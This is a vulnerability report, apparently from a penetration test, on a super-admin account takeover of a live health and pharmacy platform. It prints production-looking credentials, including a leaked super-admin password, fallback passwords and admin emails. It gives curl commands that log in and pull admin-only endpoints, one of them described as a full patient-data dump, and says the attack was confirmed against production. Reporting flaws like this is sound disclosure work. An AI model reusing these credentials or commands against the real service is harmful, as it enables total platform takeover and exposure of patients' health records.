# Super Admin Account Takeover — CRITICAL (Live-Confirmed)

## Vulnerability Summary

The production super-admin password (`SuperAdmin@2025`) is committed to the
public GitHub repository in `.env.example`. Logging in with it on the live API
yields the `SUPER_ADMIN` role and full platform control (all patients, all
revenue, pharmacy approvals, etc.).

**Status:** ✅ CONFIRMED ON LIVE — 2026-08-11
**Severity:** Critical (total platform takeover)

---

## 1. Vulnerability Identification Process

### 1.1 Finding the credential (static)

`.env.example` (git-tracked, public repo) contains:

```
SUPER_ADMIN_EMAIL="admin@evuze.rw"
SUPER_ADMIN_PASSWORD="SuperAdmin@2025"
```

The seed file `src/prisma/seed.ts` also falls back to a default
(`Test@1234`) for the super admin when `SUPER_ADMIN_PASSWORD` is unset, and
`src/auth/auth.service.ts:83` falls back to `SuperAdminPower@2025`.

### 1.2 Confirming the credential matches production (DB-level)

The live DB (see `database-credential-exposure` pack) holds the super admin
`info@ubwengelab.rw` (id `00000000-0000-0000-0000-000000000001`). Its bcrypt
hash was compared locally against candidate passwords:

```
seed hash  == Test@1234           : true   (alice/cashier/owner — same hash)
admin hash == SuperAdmin@2025     : true   ← the value from the public repo
admin hash == SuperAdminPower@2025: false
```

### 1.3 Confirming via the live API (dynamic)

```bash
curl -s -X POST $BASE/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"info@ubwengelab.rw","password":"SuperAdmin@2025"}'

# → 200 OK
# user: { id: "00000000-...-0001", role: "SUPER_ADMIN", isVerified: true }
# accessToken: "eyJhbGciOiJIUzI1NiIsInR5cCI6..."
```

Then the token grants every admin endpoint:

```bash
GET /api/super-admin/analytics   → 96 patients, 13 pharmacies, 162 orders, RWF 162,600
GET /api/super-admin/patients    → full PHI dump
GET /api/super-admin/orders/recent
```

---

## 2. Attack Chain

```
Read public repo .env.example
  → SUPER_ADMIN_PASSWORD=SuperAdmin@2025
  → POST /api/auth/login as info@ubwengelab.rw
  → SUPER_ADMIN JWT
  → read/modify every patient, pharmacy, order, payment
```

Root cause: secrets in a public repo + no forced rotation of the seeded
super-admin password in production.

---

## 3. Evidence (2026-08-11)

```
POST /api/auth/login → 200
{ "user": { "id": "00000000-0000-0000-0000-000000000001",
            "email": "info@ubwengelab.rw", "role": "SUPER_ADMIN" },
  "requiresPasswordChange": true, "accessToken": "eyJ..." }

GET /api/super-admin/analytics →
{ "totalPatients": 96, "totalPharmacies": 13, "totalOrders": 162,
  "totalRevenue": "162600", ... }
```

---

## 4. Files

| File | Purpose |
|---|---|
| `exploit.sh` | Login + dump admin-only endpoints (parameterised) |
| `remediation.md` | Step-by-step remediation |
